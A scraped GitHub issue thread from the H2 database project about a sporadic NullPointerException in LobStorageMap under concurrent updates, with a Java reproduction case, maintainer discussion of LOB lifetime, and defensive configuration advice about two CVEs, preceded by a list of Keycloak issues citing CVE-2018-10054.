keycloak-poc/keycloak#638](/keycloak-poc/keycloak/issues/638)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#639](/keycloak-poc/keycloak/issues/639)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#644](/keycloak-poc/keycloak/issues/644)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#646](/keycloak-poc/keycloak/issues/646)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#652](/keycloak-poc/keycloak/issues/652)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#656](/keycloak-poc/keycloak/issues/656)

Open

This was referenced Nov 11, 2024

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#664](/keycloak-poc/keycloak/issues/664)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#670](/keycloak-poc/keycloak/issues/670)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#672](/keycloak-poc/keycloak/issues/672)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#678](/keycloak-poc/keycloak/issues/678)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#681](/keycloak-poc/keycloak/issues/681)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#692](/keycloak-poc/keycloak/issues/692)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#694](/keycloak-poc/keycloak/issues/694)

Open

This was referenced Dec 11, 2024

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#35783](/keycloak/keycloak/issues/35783)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#35838](/keycloak/keycloak/issues/35838)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#35915](/keycloak/keycloak/issues/35915)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#35923](/keycloak/keycloak/issues/35923)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#35958](/keycloak/keycloak/issues/35958)

Open

This was referenced Dec 21, 2024

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#36097](/keycloak/keycloak/issues/36097)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#36132](/keycloak/keycloak/issues/36132)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#36138](/keycloak/keycloak/issues/36138)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1225)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=52&v=4)](/grandinj) [![@cdaller](https://avatars.githubusercontent.com/u/1531978?s=52&v=4)](/cdaller) [![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=52&v=4)](/katzyn)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_2d69a90a_20250110_111422.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1808)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1808)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=h2database%2Fh2database)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[h2database](/h2database)
/
**[h2database](/h2database/h2database)**
Public

* [Notifications](/login?return_to=%2Fh2database%2Fh2database) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fh2database%2Fh2database)
* [Star
   4.3k](/login?return_to=%2Fh2database%2Fh2database)

* [Code](/h2database/h2database)
* [Issues
  361](/h2database/h2database/issues)
* [Pull requests
  17](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects
  0](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

Additional navigation options

* [Code](/h2database/h2database)
* [Issues](/h2database/h2database/issues)
* [Pull requests](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Sporadic NullPointerException in LobStorageMap in 1.4.199 #1808

Closed

[bwaldvogel](/bwaldvogel) opened this issue
Mar 13, 2019
· 39 comments

Closed

# [Sporadic NullPointerException in LobStorageMap in 1.4.199](#top) #1808

[bwaldvogel](/bwaldvogel) opened this issue
Mar 13, 2019
· 39 comments

## Comments

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=80&u=2a2b671be6ec28ca9be08149b36d30594e4f877b&v=4)](/bwaldvogel)

Copy link

### **[bwaldvogel](/bwaldvogel)** commented [Mar 13, 2019](#issue-420632951) • edited Loading

| After upgrading H2 from 1.4.197 to 1.4.199 I started to see sporadic NullPointerExceptions in LobStorageMap:  ``` Caused by: java.lang.NullPointerException 	at org.h2.store.LobStorageMap.copyLob(LobStorageMap.java:255) 	at org.h2.value.ValueLobDb.copyToResult(ValueLobDb.java:554) 	at org.h2.value.ValueLobDb.copyToResult(ValueLobDb.java:40) 	at org.h2.result.LocalResultImpl.cloneLobs(LocalResultImpl.java:280) 	at org.h2.result.LocalResultImpl.addRow(LocalResultImpl.java:315) 	at org.h2.command.dml.Select.queryFlat(Select.java:744) 	at org.h2.command.dml.Select.queryWithoutCache(Select.java:884) 	at org.h2.command.dml.Query.queryWithoutCacheLazyCheck(Query.java:151) 	at org.h2.command.dml.Query.query(Query.java:435) 	at org.h2.command.dml.Query.query(Query.java:397) 	at org.h2.command.CommandContainer.query(CommandContainer.java:145) 	at org.h2.command.Command.executeQuery(Command.java:202)  ```  ~~I’ve not yet had the time to create a minimized test case that reproduces this issue.~~ *Update:* see [my next comment](https://github.com/h2database/h2database/issues/1808#issuecomment-473380416). |
| --- |
| The text was updated successfully, but these errors were encountered: |

 👍
2
 virgo47 and gnefedev reacted with thumbs up emoji

All reactions

* 👍
  2 reactions

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 14, 2019](#issuecomment-472670052)

| There were no significant changes in `LobStorageMap` since 1.4.197, perhaps this issue was revealed by some other changes. How your query looks like? Where these LOBs came from? Is their concurrent deletion possible?  A test case would be nice, of course. |
| --- |

All reactions

Sorry, something went wrong.

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=80&u=2a2b671be6ec28ca9be08149b36d30594e4f877b&v=4)](/bwaldvogel)

Copy link

Author

### **[bwaldvogel](/bwaldvogel)** commented [Mar 15, 2019](#issuecomment-473380416)

| Here’s a minimized test case that reliably fails for me with the `NullPointerException` in `LobStorageMap` as mentioned in the issue description:  ``` Connection conn1 = DriverManager.getConnection("jdbc:h2:mem:testdb");  String createTable = "create table t1 (id int, ver bigint, data text, primary key (id));"; conn1.prepareStatement(createTable).executeUpdate();  String insert = "insert into t1 (id, ver, data) values (1, 0, ?)"; PreparedStatement insertStmt = conn1.prepareStatement(insert); String largeData = org.h2.util.StringUtils.pad("", 512, "x", false); insertStmt.setString(1, largeData); insertStmt.executeUpdate();  new Thread() {     @Override     public void run() {         try {             Connection conn2 = DriverManager.getConnection("jdbc:h2:mem:testdb");             String update = "update t1 set ver = ver + 1 where id = 1";             while (!Thread.currentThread().isInterrupted()) {                 conn2.prepareStatement(update).executeUpdate();             }         } catch (Exception e) {             throw new RuntimeException(e);         }     } }.start();  while (true) {     conn1.prepareStatement("select * from t1 where id = 1").executeQuery(); } ```  It fails for me in `1.4.198` and `1.4.199` but throws no exception in `1.4.197`. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 15, 2019](#issuecomment-473473377)

| Thank you for a test case. I can reproduce this issue with it.  Unfortunately, this issue is complicated. Perhaps it never worked reliably, but it was revealed only due to higher concurrency of 1.4.198. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 16, 2019](#issuecomment-473479498)

| There are two problems.   1. H2 allocates a new copy of LOB when a row is inserted or updated, it is not efficient. 2. When a row is removed or updated, old LOBs are going to be removed on commit of the current session. But other sessions may still use the old row.   `SELECT FOR UPDATE` instead of a plain `SELECT` can be used as a temporary workaround. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 16, 2019](#issuecomment-473502014)

| When a LOB column is used inside a `WHERE` criteria `SELECT … FOR UPDATE` will not work too.  We need to preserve LOBs until all snapshot of a table (map) that were taken before LOB deletion are released, or introduce LOB copying in a `TableFilter`, but it may slow down operations on tables with LOBs. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Mar 16, 2019](#issuecomment-473503637)

| 1. H2 allocates a new copy of LOB when a row is inserted or updated, it is not efficient.  Sure, however, the strategy is that the "top" LOB table just has foreign keys to the actual data, so we are copying a fairly small row. The strategy is that when all of the "top" LOB table rows that refer to a specific LOB are gone, we can delete the LOB. We may need to add some extra functionality to the MVStore to ask it what the oldest "live" version of a specific row is. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 16, 2019](#issuecomment-473504662)

| But each updated copy of a row has different identities of LOBs (even when LOB is not changed). Due to copy-on-write nature row that was updated multiple times may have a lot of copies with different identities and all these identities may be used by running queries. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Mar 16, 2019](#issuecomment-473575694)

| I don't have any genius ideas right now. The easiest thing (IMO) to do would be to keep an in-memory data structure, that tracked when a given LOB was still in use by any active transactions, and then deleted it when the last active reference went away. However, that would leave us vulnerable to leaking LOBs on a crash, which is, I think, a reasonable tradeoff. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 17, 2019](#issuecomment-473604471)

| LOB reference may exist only on disk in an older version of a map, that was already open by a long-running query.   1. LOBs can be garbage collected only when they aren't referenced any more. This way may increase database size too much on intensive operations. 2. Table filter can copy the LOBs immediately, and rescan the row for actual (not snapshot) data on failure. In this way we need to know whether such columns are accessed or not (if not, no reason to copy unused data) and we possibly need to disable index-sorted optimization (for the same reasons as in `FOR UPDATE` where the locked row may change its sorting position due to changed values). Perhaps such copies needs to be freed when they weren't included in result. Also we can't implement higher isolation levels with such change. 3. We can try to delay LOB removal to the commit of all running transactions (not only the current one as now). New transactions should not be awaited, because they can't see such old data. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 17, 2019](#issuecomment-473626507)

| For option (3) LOB may be removed when all commands that were running at commit end will be completed. There is no need to wait for the whole transactions for now, because H2 doesn't have repeatable read and serializable isolation. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 17, 2019](#issuecomment-473626675)

| But it also means that on abnormal process termination unused LOBs may stay alive. They need to be marked for deletion somehow to allow their deallocation during next database startup. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Mar 17, 2019](#issuecomment-473705871)

| One scenario with these proposed solutons that is unpleasant is this: user does  ``` SELECT * FROM very_large_table_with_a_lob_colmn  ```  which requires us to store a ton of in-memory data noting that all those LOBs are in-use.  Is it possible we could fix this by making LobStorageMap go via TransactionStore instead of using MVStore directly? It feels like we are talking about reproducing the functionality we already have there. |
| --- |

All reactions

Sorry, something went wrong.

[![@bwaldvogel](https://avatars.githubusercontent.com/u/29931?s=80&u=2a2b671be6ec28ca9be08149b36d30594e4f877b&v=4)](/bwaldvogel)

Copy link

Author

### **[bwaldvogel](/bwaldvogel)** commented [Mar 17, 2019](#issuecomment-473714530)

| I noticed that the NullPointerException does not appear if the LOB column is not selected:  ``` while (true) {     conn1.prepareStatement("select id, ver from t1 where id = 1").executeQuery(); } ```  So in some scenarios this could be a workaround for `1.4.198` and `1.4.199`. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 18, 2019](#issuecomment-473733767)

| `SELECT * FROM very_large_table_with_a_lob_colmn`  `LocalResultImpl` currently performs a copy of each LOB during execution of that statement.  which requires us to store a ton of in-memory data noting that all those LOBs are in-use.  No, we only need to additionally preserve a LOB after `UPDATE` / `DELETE` / `MERGE` for a short time (if there are no long-running queries). Actually all these LOBs are already gathered by a session, but it purges them all on commit. This operation should be delayed a little bit more until completion of all currently running commands.  Is it possible we could fix this by making LobStorageMap go via TransactionStore instead of using MVStore directly?  With `TransactionStore` we need to operate on the same version of a map during `SELECT` execution, perhaps it isn't really possible, because cursor of a `SELECT` statement iterates over a snapshot of a map and snapshot of another map with LOBs may be not consistent with it.  `SELECT FOR UPDATE` is even more complicated, because it needs to see both old snapshot of LOB map and its current state. Old for the first evalution of a `WHERE` criteria (it may use some condition on a LOB column) and current for the second evalutation when matched row is already locked. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Mar 18, 2019](#issuecomment-473917637)

| This operation should be delayed a little bit more until completion of all currently running commands.  That sounds reasonable. It'll slow things down a bit, but LOBs are not exactly speedy to start with. |
| --- |

All reactions

Sorry, something went wrong.

[![@andreitokar](https://avatars.githubusercontent.com/u/8950218?s=80&u=88b07e2933228893ab0ffbc651738148e74ecf09&v=4)](/andreitokar)

Copy link

Contributor

### **[andreitokar](/andreitokar)** commented [Mar 18, 2019](#issuecomment-474134504)

| [@katzyn](https://github.com/katzyn),  With TransactionStore we need to operate on the same version of a map during SELECT execution, perhaps it isn't really possible, because cursor of a SELECT statement iterates over a snapshot of a map and snapshot of another map with LOBs may be not consistent with it.  This should not be a problem. We can get a coherent snapshot of multiple maps, if we need to (i.e. as in TransactionMap.sizeAsLong()). We would need something like that, when (and if) we are going to implement "repeatable read" or "snapshot" isolation level. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 19, 2019](#issuecomment-474196832)

| Thanks for the pointer. OK, it's possible, but we need to change our `LobStorageInterface` significantly. |
| --- |

All reactions

Sorry, something went wrong.

[terrypacker](/terrypacker)
added a commit
to MangoAutomation/ma-core-public
that referenced
this issue
[May 16, 2019](#ref-commit-4053e9d)
[![@terrypacker](https://avatars.githubusercontent.com/u/3905204?s=40&u=18f9651f004c148242b8407fa712690192e621dc&v=4)](/terrypacker)

`[H2Proxy revert MV Store engine use, force PageStore.](/MangoAutomation/ma-core-public/commit/4053e9d09f5a64bd130cae6f8c3020fb150b73b8 "H2Proxy revert MV Store engine use, force PageStore.

Page store seems like a poor choice at present:
https://github.com/h2database/h2database/issues/1808")`
…

`[4053e9d](/MangoAutomation/ma-core-public/commit/4053e9d09f5a64bd130cae6f8c3020fb150b73b8)`

```
Page store seems like a poor choice at present:
[h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808)
```

[![@rgoede](https://avatars.githubusercontent.com/u/6567529?s=80&v=4)](/rgoede)

Copy link

### **[rgoede](/rgoede)** commented [Oct 28, 2019](#issuecomment-547001199)

| I get the same error in my unit tests since 1.4.198. It is still present in 1.4.200. I reverted to 1.4.197 but this has two associated vulnarabilities ([CVE-2018-10054](https://github.com/advisories/GHSA-9pf8-qqhm-7w64 "CVE-2018-10054") and [CVE-2018-14335](https://github.com/advisories/GHSA-wm64-883p-84j3 "CVE-2018-14335")). |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Oct 28, 2019](#issuecomment-547004720)

| 1.4.198 is a beta-quality version, don't use it.  And both these CVEs are fake ones, if you don't use stupid insecure configurations you will not be affected. |
| --- |

All reactions

Sorry, something went wrong.

[![@tsegall](https://avatars.githubusercontent.com/u/2955355?s=80&u=cc9f4ee55ddc8a139a18cd226da3c2c9cc546487&v=4)](/tsegall)

Copy link

### **[tsegall](/tsegall)** commented [Oct 28, 2019](#issuecomment-547056053)

| So we are currently stuck on 1.4.196 due to the issues mentioned above with LOBs. Is this likely to be addressed any time soon - or should we be looking at other options? |
| --- |

All reactions

Sorry, something went wrong.

[![@vineetvdubey](https://avatars.githubusercontent.com/u/35378726?s=80&u=344777b1d54e00c7c6a81ea40bc09719fcb0f0dd&v=4)](/vineetvdubey)

Copy link

### **[vineetvdubey](/vineetvdubey)** commented [Nov 25, 2019](#issuecomment-558125663) • edited Loading

| This issue is still present in 1.4.200 but not in 1.4.197 and is still reproducible using the test case provided by [@bwaldvogel](https://github.com/bwaldvogel)  On a side note: Adding the below statement, just after creating connection, passes the minimized test: `conn1.prepareStatement("SET MAX_LENGTH_INPLACE_LOB 1024;").execute();`  Is the `MAX_LENGTH_INPLACE_LOB` parameter related in any way with this issue [@katzyn](https://github.com/katzyn) ? |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Nov 25, 2019](#issuecomment-558128340)

| Small LOBs aren't stored separately as larger ones. Only LOBs from a LOB storage are affected by this issue, small LOBs are fine. You can use this setting in your unit tests (if you don't have really large LOBs), but it's not a solution for a production environment. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=40&v=4)](/katzyn)
[katzyn](/katzyn)
mentioned this issue
[Dec 9, 2019](#ref-issue-534743334)

[NullPointerException when select blob after parallel update
#2322](/h2database/h2database/issues/2322)

Closed

[![@NicoleG25](https://avatars.githubusercontent.com/u/50918335?s=80&u=c3406b4813cac2098db848ca294c34426efcc15d&v=4)](/NicoleG25)

Copy link

### **[NicoleG25](/NicoleG25)** commented [Mar 15, 2020](#issuecomment-599199701)

| Hi [@katzyn](https://github.com/katzyn) , I understand that if you do not use stupid configurations you wont be affected by [CVE-2018-10054](https://github.com/advisories/GHSA-9pf8-qqhm-7w64 "CVE-2018-10054"), that being said, these 'stupid configurations' only affect 1.4.197 onward or also 1.4.196 and lower?  Thanks in advance ! :) |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Mar 15, 2020](#issuecomment-599203115)

| All **old** versions allow remote database creation if TCP, PG/ODBC, or web server is started. If you use them, you must also ensure that your server is protected from unauthorized access. All versions of H2 allow connections only from localhost by default and it can be enough in many use cases (unless you have sessions of multiple users on the same terminal server or something like it). When you enable remote access, you need to guard your ports somehow from connections from untrusted systems. Actually you should normally guard ports of all database systems that you use, not only the ports of H2.  In the recent versions of H2 remote database creation is disallowed even when remote access is enabled. It improves security of such configurations. But, again, remote access from untrusted sources to a database in not a good idea at all. At least you should also use strong passwords for users of your databases, and use the `-baseDir` option to disallow access to databases from other places in the file system.  Remote database creation is dangerous because it gives `ADMIN` privileges to a newly created database, but users with such privileges of existing databases can also do everything with JVM and underlying system. Database is not a secure container, `ADMIN` users have access to the system by design.  If you use embedded databases only and don't start network servers, you aren't affected by anything.  [CVE-2018-10054](https://github.com/advisories/GHSA-9pf8-qqhm-7w64 "CVE-2018-10054") is not about the H2, it is about Datomic that uses insecurely configured H2.  [CVE-2018-14335](https://github.com/advisories/GHSA-wm64-883p-84j3 "CVE-2018-14335") is about H2 Console that also was incorrectly configured by somebody to allow access from untrusted users. It is more secure in recent versions of H2, however; tools aren't available any more for regular users of console. In you want to use it in old versions of H2, make sure that it is not available for others; for example, don't enable the remote access to H2's own web server, and if you use a H2 Console as a servlet on an application server, use the appropriate configuration with security constraints. <https://h2database.com/html/tutorial.html#usingH2ConsoleServlet> |
| --- |

All reactions

Sorry, something went wrong.

[![@NicoleG25](https://avatars.githubusercontent.com/u/50918335?s=80&u=c3406b4813cac2098db848ca294c34426efcc15d&v=4)](/NicoleG25)

Copy link

### **[NicoleG25](/NicoleG25)** commented [Mar 15, 2020](#issuecomment-599204927)

| All **old** versions allow remote database creation if TCP, PG/ODBC, or web server is started. If you use them, you must also ensure that your server is protected from unauthorized access. All versions of H2 allow connections only from localhost by default and it can be enough in many use cases (unless you have sessions of multiple users on the same terminal server or something like it). When you enable remote access, you need to guard your ports somehow from connections from untrusted systems. Actually you should normally guard ports of all database systems that you use, not only the ports of H2.  In the recent versions of H2 remote database creation is disallowed even when remote access is enabled. It improves security of such configurations. But, again, remote access from untrusted sources to a database in not a good idea at all. At least you should also use strong passwords for users of your databases, and use the `-baseDir` option to disallow access to databases from other places in the file system.  Remote database creation is dangerous because it gives `ADMIN` privileges to a newly created database, but users with such privileges of existing databases can also do everything with JVM and underlying system. Database is not a secure container, `ADMIN` users have access to the system by design.  If you use embedded databases only and don't start network servers, you aren't affected by anything.  CVE-2018-10054 is not about the H2, it is about Datomic that uses insecurely configured H2.  CVE-2018-14335 is about H2 Console that also was incorrectly configured by somebody to allow access from untrusted users. It is more secure in recent versions of H2, however; tools aren't available any more for regular users of console. In you want to use it in old versions of H2, make sure that it is not available for others; for example, don't enable the remote access to H2's own web server, and if you use a H2 Console as a servlet on an application server, use the appropriate configuration with security constraints. <https://h2database.com/html/tutorial.html#usingH2ConsoleServlet>  Thank you very much for your detailed reply ! It's very appreciated. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=40&v=4)](/katzyn)
[katzyn](/katzyn)
mentioned this issue
[Mar 31, 2020](#ref-issue-590954980)

[feature: store LOB data in files external to the database
#2531](/h2database/h2database/issues/2531)

Open

[dutoitc](/dutoitc)
pushed a commit
to dutoitc/copper
that referenced
this issue
[May 19, 2020](#ref-commit-e0c16aa)

`[Forced H2 1.4.197 because of](/dutoitc/copper/commit/e0c16aa340dc853535e2d0114ed7b9e3d4feffd7 "Forced H2 1.4.197 because of https://github.com/h2database/h2database/issues/1808") [h2database/h2database#1808](https://github.com/h2database/h2database/issues/1808)`

`[e0c16aa](/dutoitc/copper/commit/e0c16aa340dc853535e2d0114ed7b9e3d4feffd7)`

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=40&v=4)](/katzyn)
[katzyn](/katzyn)
mentioned this issue
[Jul 3, 2020](#ref-issue-650612062)

[NPE on a select query where BLOB are present
#2732](/h2database/h2database/issues/2732)

Closed

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Jul 3, 2020](#issuecomment-653568950) • edited Loading

| I don't have any genius ideas right now. The easiest thing (IMO) to do would be to keep an in-memory data structure, that tracked when a given LOB was still in use by any active transactions, and then deleted it when the last active reference went away.  [WeakHashMap](https://docs.oracle.com/javase/8/docs/api/java/util/WeakHashMap.html) |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=40&v=4)](/katzyn)
[katzyn](/katzyn)
mentioned this issue
[Jul 22, 2020](#ref-issue-577464323)

[Release H2 2.0.202
#2491](/h2database/h2database/issues/2491)

Closed

[![@anmalysh-yb](https://avatars.githubusercontent.com/u/80941592?s=40&v=4)](/anmalysh-yb)
[anmalysh-yb](/anmalysh-yb)
mentioned this issue
[Apr 23, 2021](#ref-issue-866006099)

[[Platform] Fix BackupUniverseTest
yugabyte/yugabyte-db#8145](/yugabyte/yugabyte-db/issues/8145)

Open

[![@abelom](https://avatars.githubusercontent.com/u/575495?s=80&v=4)](/abelom)

Copy link

### **[abelom](/abelom)** commented [Feb 22, 2022](#issuecomment-1048000101)

| Hello from 2022. We are still affected by this sporadic issue :( |
| --- |

All reactions

Sorry, something went wrong.

[![@ade90036](https://avatars.githubusercontent.com/u/6196152?s=80&v=4)](/ade90036)

Copy link

### **[ade90036](/ade90036)** commented [Feb 22, 2022](#issuecomment-1048035397) • edited Loading

